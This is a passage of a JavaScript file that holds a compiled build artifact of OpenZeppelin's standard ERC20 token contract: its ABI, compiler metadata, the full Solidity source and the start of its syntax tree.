const erc20ABI = {
  "contractName": "ERC20",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "allowance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientAllowance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientBalance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "approver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidApprover",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidReceiver",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSender",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSpender",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSpender\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. The default value of {decimals} is 18. To change this, you should override this function so it returns a different value. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC-20 applications.\",\"errors\":{\"ERC20InsufficientAllowance(address,uint256,uint256)\":[{\"details\":\"Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\",\"params\":{\"allowance\":\"Amount of tokens a `spender` is allowed to operate with.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"ERC20InsufficientBalance(address,uint256,uint256)\":[{\"details\":\"Indicates an error related to the current `balance` of a `sender`. Used in transfers.\",\"params\":{\"balance\":\"Current balance for the interacting account.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidApprover(address)\":[{\"details\":\"Indicates a failure with the `approver` of a token to be approved. Used in approvals.\",\"params\":{\"approver\":\"Address initiating an approval operation.\"}}],\"ERC20InvalidReceiver(address)\":[{\"details\":\"Indicates a failure with the token `receiver`. Used in transfers.\",\"params\":{\"receiver\":\"Address to which tokens are being transferred.\"}}],\"ERC20InvalidSender(address)\":[{\"details\":\"Indicates a failure with the token `sender`. Used in transfers.\",\"params\":{\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidSpender(address)\":[{\"details\":\"Indicates a failure with the `spender` to be approved. Used in approvals.\",\"params\":{\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}]},\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"See {IERC20-allowance}.\"},\"approve(address,uint256)\":{\"details\":\"See {IERC20-approve}. NOTE: If `value` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address.\"},\"balanceOf(address)\":{\"details\":\"See {IERC20-balanceOf}.\"},\"constructor\":{\"details\":\"Sets the values for {name} and {symbol}. All two of these values are immutable: they can only be set once during construction.\"},\"decimals()\":{\"details\":\"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token, usually a shorter version of the name.\"},\"totalSupply()\":{\"details\":\"See {IERC20-totalSupply}.\"},\"transfer(address,uint256)\":{\"details\":\"See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `value`.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC20-transferFrom}. Skips emitting an {Approval} event indicating an allowance update. This is not required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve]. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `value`. - the caller must have allowance for ``from``'s tokens of at least `value`.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":\"ERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"keccak256\":\"0x880da465c203cec76b10d72dbd87c80f387df4102274f23eea1f9c9b0918792b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://399594cd8bb0143bc9e55e0f1d071d0d8c850a394fb7a319d50edd55d9ed822b\",\"dweb:/ipfs/QmbPZzgtT6LEm9CMqWfagQFwETbV1ztpECBB1DtQHrKiRz\"]},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0xbf61ab2ae1d575a17ea58fbb99ca232baddcc4e0eeea180e84cbc74b0c348b31\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4e0968705bad99747a8e5288aa008678c2be2f471f919dce3925a3cc4f1dee09\",\"dweb:/ipfs/QmbAFnCQfo4tw6ssfQSjhA5LzwHWNNryXN8bX7ty8jiqqn\"]},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x70f2f713b13b7ce4610bcd0ac9fec0f3cc43693b043abcb8dc40a42a726eb330\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://c13d13304ac79a83ab1c30168967d19e2203342ebbd6a9bbce4db7550522dcbf\",\"dweb:/ipfs/QmeN5jKMN2vw5bhacr6tkg78afbTTZUeaacNHqjWt4Ew1r\"]},\"@openzeppelin/contracts/utils/Context.sol\":{\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6a708e8a5bdb1011c2c381c9a5cfd8a9a956d7d0a9dc1bd8bcdaf52f76ef2f12\",\"dweb:/ipfs/Qmax9WHBnVsZP46ZxEMNRQpLQnrdE4dK8LehML1Py8FowF\"]}},\"version\":1}",
  "bytecode": "0x",
  "deployedBytecode": "0x",
  "immutableReferences": {},
  "generatedSources": [],
  "deployedGeneratedSources": [],
  "sourceMap": "",
  "deployedSourceMap": "",
  "source": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"./IERC20.sol\";\nimport {IERC20Metadata} from \"./extensions/IERC20Metadata.sol\";\nimport {Context} from \"../../utils/Context.sol\";\nimport {IERC20Errors} from \"../../interfaces/draft-IERC6093.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Skips emitting an {Approval} event indicating an allowance update. This is not\n     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n",
  "sourcePath": "@openzeppelin/contracts/token/ERC20/ERC20.sol",
  "ast": {
    "absolutePath": "@openzeppelin/contracts/token/ERC20/ERC20.sol",
    "exportedSymbols": {
      "Context": [
        2995
      ],
      "ERC20": [
        994
      ],
      "IERC20": [
        1072
      ],
      "IERC20Errors": [
        384
      ],
      "IERC20Metadata": [
        1098
      ]
    },
    "id": 995,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 481,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".20"
        ],
        "nodeType": "PragmaDirective",
        "src": "105:24:8"
      },
      {
        "absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
        "file": "./IERC20.sol",
        "id": 483,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 995,
        "sourceUnit": 1073,
        "src": "131:36:8",
        "symbolAliases": [
          {
            "foreign": {
              "id": 482,
              "name": "IERC20",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 1072,
              "src": "139:6:8",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "absolutePath": "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol",
        "file": "./extensions/IERC20Metadata.sol",
        "id": 485,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 995,
        "sourceUnit": 1099,
        "src": "168:63:8",
        "symbolAliases": [
          {
            "foreign": {
              "id": 484,
              "name": "IERC20Metadata",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 1098,
              "src": "176:14:8",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "absolutePath": "@openzeppelin/contracts/utils/Context.sol",
        "file": "../../utils/Context.sol",
        "id": 487,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 995,
        "sourceUnit": 2996,
        "src": "232:48:8",
        "symbolAliases": [
          {
            "foreign": {
              "id": 486,
              "name": "Context",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 2995,
              "src": "240:7:8",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "absolutePath": "@openzeppelin/contracts/interfaces/draft-IERC6093.sol",
        "file": "../../interfaces/draft-IERC6093.sol",
        "id": 489,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 995,
        "sourceUnit": 480,
        "src": "281:65:8",
        "symbolAliases": [
          {
            "foreign": {
              "id": 488,
              "name": "IERC20Errors",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 384,
              "src": "289:12:8",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "abstract": true,
        "baseContracts": [
          {
            "baseName": {
              "id": 491,
              "name": "Context",
              "nameLocations": [
                "1133:7:8"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 2995,
              "src": "1133:7:8"
            },
            "id": 492,
            "nodeType": "InheritanceSpecifier",
            "src": "1133:7:8"
          },
          {
            "baseName": {
              "id": 493,
              "name": "IERC20",
              "nameLocations": [
                "1142:6:8"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 1072,
              "src": "1142:6:8"
            },
            "id": 494,
            "nodeType": "InheritanceSpecifier",
            "src": "1142:6:8"
          },
          {
            "baseName": {
              "id": 495,
              "name": "IERC20Metadata",
              "nameLocations": [
                "1150:14:8"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 1098,
              "src": "1150:14:8"
            },
            "id": 496,
            "nodeType": "InheritanceSpecifier",
            "src": "1150:14:8"
          },
          {
            "baseName": {
              "id": 497,
              "name": "IERC20Errors",
              "nameLocations": [
                "1166:12:8"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 384,
              "src": "1166:12:8"
            },
            "id": 498,
            "nodeType": "InheritanceSpecifier",
            "src": "1166:12:8"
          }
        ],
        "canonicalName": "ERC20",
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": {
          "id": 490,
          "nodeType": "StructuredDocumentation",
          "src": "348:757:8",
          "text": " @dev Implementation of the {IERC20} interface.\n This implementation is agnostic to the way tokens are created. This means\n that a supply mechanism has to be added in a derived contract using {_mint}.\n TIP: For a detailed writeup see our guide\n https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n to implement supply mechanisms].\n The default value of {decimals} is 18. To change this, you should override\n this function so it returns a different value.\n We have followed general OpenZeppelin Contracts guidelines: functions revert\n instead returning `false` on failure. This behavior is nonetheless\n conventional and does not conflict with the expectations of ERC-20\n applications."
        },
        "fullyImplemented": true,
        "id": 994,
        "linearizedBaseContracts": [
          994,
          384,
          1098,
          1072,
          2995
        ],
        "name": "ERC20",
        "nameLocation": "1124:5:8",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 502,
            "mutability": "mutable",
            "name": "_balances",
            "nameLocation": "1229:9:8",
            "nodeType": "VariableDeclaration",
            "scope": 994,
            "src": "1185:53:8",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
              "typeString": "mapping(address => uint256)"
            },
            "typeName": {
              "id": 501,
              "keyName": "account",
              "keyNameLocation": "1201:7:8",
              "keyType": {
                "id": 499,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "1193:7:8",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "1185:35:8",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                "typeString": "mapping(address => uint256)"
              },
              "valueName": "",
              "valueNameLocation": "-1:-1:-1",
              "valueType": {
                "id": 500,
                "name": "uint256",
                "nodeType": "ElementaryTypeName",
